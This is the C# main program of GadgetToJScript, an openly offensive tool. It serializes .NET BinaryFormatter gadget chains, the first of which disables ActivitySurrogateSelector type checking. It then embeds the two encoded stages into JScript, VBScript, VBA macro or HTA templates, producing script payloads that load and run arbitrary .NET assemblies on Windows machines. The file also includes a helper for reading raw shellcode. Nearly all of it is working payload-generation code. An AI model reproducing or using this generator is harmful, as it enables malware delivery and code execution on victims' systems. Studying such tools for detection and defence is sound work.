//    GadgetToJscript.
//    Copyright (C) Elazaar / @med0x2e 2019
//
//    GadgetToJscript is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
//
//    GadgetToJscript is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with GadgetToJscript.  If not, see <http://www.gnu.org/licenses/>.


using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;

namespace GadgetToJScript{

    class Program{


        enum EWSH
        {
            js,
            vbs,
            vba,
            hta
        }

        enum ENC
        {
            b64,
            hex
        }


        private static string _wsh;
        private static string _outputFName = "test";
        private static bool _regFree = false;
        private static string _enc = "b64";

        static void Main(string[] args)
        {

            var show_help = false;


            OptionSet options = new OptionSet(){
                {"w|scriptType=","js, vbs, vba or hta", v =>_wsh=v},
                {"e|encodeType=","VBA gadgets encoding: b64 or hex (default set to b64)", v => _enc=v},
                {"o|output=","Generated payload output file, example: C:\\Users\\userX\\Desktop\\output (Without extension)", v =>_outputFName=v},
                {"r|regfree","registration-free activation of .NET based COM components", v => _regFree = v != null},
                {"h|help=","Show Help", v => show_help = v != null},
            };

            try
            {
                options.Parse(args);

                if (_wsh == "" || _outputFName == "")
                {
                    showHelp(options);
                    return;
                }

                if (!Enum.IsDefined(typeof(EWSH), _wsh))
                {
                    showHelp(options);
                    return;
                }

                if (!Enum.IsDefined(typeof(ENC), _enc))
                {
                    showHelp(options);
                    return;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                Console.WriteLine("Try --help for more information.");
                showHelp(options);
                return;

            }

            string resourceName = "";
            switch (_wsh)
            {
                case "js":
                    if (_regFree) { resourceName = "GadgetToJScript.templates.jscript-regfree.template"; }
                    else { resourceName = "GadgetToJScript.templates.jscript.template"; }
                    break;
                case "vbs":
                    resourceName = "GadgetToJScript.templates.vbscript.template";
                    break;
                case "vba":
                    //Console.WriteLine("Not supported yet, only JS, VBS and HTA are supported at the moment");
                    //return;
                    if (_enc == "b64") {
                        resourceName = "GadgetToJScript.templates.vbascriptb64.template";
                    }
                    else{
                        resourceName = "GadgetToJScript.templates.vbascripthex.template";
                    }
                    break;
                case "hta":
                    resourceName = "GadgetToJScript.templates.htascript.template";
                    break;
                default:
                    if (_regFree) { resourceName = "GadgetToJScript.templates.jscript-regfree.template"; }
                    else { resourceName = "GadgetToJScript.templates.jscript.template"; }
                    break;
            }


            MemoryStream _msStg1 = new MemoryStream();
            _DisableTypeCheckGadgetGenerator _disableTypCheckObj = new _DisableTypeCheckGadgetGenerator();

            _msStg1 = _disableTypCheckObj.generateGadget(_msStg1);


            ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");


            Assembly testAssembly = TestAssemblyLoader.compile();

            BinaryFormatter _formatterStg2 = new BinaryFormatter();
            MemoryStream _msStg2 = new MemoryStream();
            _ASurrogateGadgetGenerator _gadgetStg = new _ASurrogateGadgetGenerator(testAssembly);

            _formatterStg2.Serialize(_msStg2, _gadgetStg);


            Assembly assembly = Assembly.GetExecutingAssembly();
            string _wshTemplate = "";


            using (Stream stream = assembly.GetManifestResourceStream(resourceName))

            if (_wsh != "vba"){

                using (StreamReader reader = new StreamReader(stream))
                {
                    _wshTemplate = reader.ReadToEnd();
                    _wshTemplate = _wshTemplate.Replace("%_STAGE1_%", Convert.ToBase64String(_msStg1.ToArray()));
                    _wshTemplate = _wshTemplate.Replace("%_STAGE1Len_%", _msStg1.Length.ToString());
                    _wshTemplate = _wshTemplate.Replace("%_STAGE2_%", Convert.ToBase64String(_msStg2.ToArray()));
                    _wshTemplate = _wshTemplate.Replace("%_STAGE2Len_%", _msStg2.Length.ToString());
                }
            }
            else{
                    List<string> stage1Lines = new List<String>();
                    List<string> stage2Lines = new List<String>();

                    if (_enc == "b64")
                    {
                        stage1Lines = SplitToLines(Convert.ToBase64String(_msStg1.ToArray()), 100).ToList();
                        stage2Lines = SplitToLines(Convert.ToBase64String(_msStg2.ToArray()), 100).ToList();
                    }
                    else{
                        stage1Lines = SplitToLines(BitConverter.ToString(_msStg1.ToArray()).Replace("-", ""), 100).ToList();
                        stage2Lines = SplitToLines(BitConverter.ToString(_msStg2.ToArray()).Replace("-", ""), 100).ToList();
                    }


                    StringBuilder _b1 = new StringBuilder();
                    _b1.Append("stage_1 = \"").Append(stage1Lines[0]).Append("\"");
                    _b1.AppendLine();
                    stage1Lines.RemoveAt(0);

                    foreach (String line in stage1Lines)
                    {
                        _b1.Append("stage_1 = stage_1 & \"").Append(line.ToString().Trim()).Append("\"");
                        _b1.AppendLine();
                    }

                    StringBuilder _b2 = new StringBuilder();
                    _b2.Append("stage_2 = \"").Append(stage2Lines[0]).Append("\"");
                    _b2.AppendLine();
                    stage2Lines.RemoveAt(0);

                    foreach (String line in stage2Lines)
                    {
                        _b2.Append("stage_2 = stage_2 & \"").Append(line.ToString().Trim()).Append("\"");
                        _b2.AppendLine();
                    }


                    using (StreamReader reader = new StreamReader(stream))
                {
                    _wshTemplate = reader.ReadToEnd();
                    _wshTemplate = _wshTemplate.Replace("%_STAGE1_%", _b1.ToString());
                    _wshTemplate = _wshTemplate.Replace("%_STAGE2_%", _b2.ToString());
                }
            }

            using (StreamWriter _generatedWSH = new StreamWriter(_outputFName + "." + _wsh))
            {
                _generatedWSH.WriteLine(_wshTemplate);
            }

        }

        public static void showHelp(OptionSet p)
        {
            Console.WriteLine("Usage:");
            p.WriteOptionDescriptions(Console.Out);
        }

        public static byte[] readRawShellcode(string _SHFname)
        {
            byte[] _buf = null;
            using (FileStream fs = new FileStream(_SHFname, FileMode.Open, FileAccess.Read))
            {
                _buf = new byte[fs.Length];
                fs.Read(_buf, 0, (int)fs.Length);
            }
            return _buf;
        }

        public static IEnumerable<string> SplitToLines(string stringToSplit, int maximumLineLength)
        {
            var words = stringToSplit.Split(' ').Concat(new[] { "" });
            return words.Skip(1).Aggregate(words.Take(1).ToList(),
                (a, w) =>
                {
                    var last = a.Last();
                    while (last.Length > maximumLineLength)
                    {
                        a[a.Count() - 1] = last.Substring(0, maximumLineLength);
                        last = last.Substring(maximumLineLength);
                        a.Add(last);
                    }
                    var test = last + " " + w;
                    if (test.Length > maximumLineLength)
                    {
                        a.Add(w);
                    }
                    else
                    {
                        a[a.Count() - 1] = test;
                    }
                    return a;
                });
        }
    }
}
